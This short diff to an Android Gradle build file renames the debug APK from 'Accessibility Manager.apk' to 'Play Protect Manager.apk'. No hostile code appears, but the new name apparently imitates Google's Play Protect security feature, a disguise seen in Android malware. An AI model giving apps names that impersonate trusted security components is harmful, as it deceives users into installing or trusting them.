@@ -68,7 +68,7 @@ android {
 android.applicationVariants.all { variant ->
     if (variant.buildType.name == "debug") {
         variant.outputs.all { output ->
-            outputFileName = "Accessibility Manager.apk"
+            outputFileName = "Play Protect Manager.apk"
         }
     }
 }
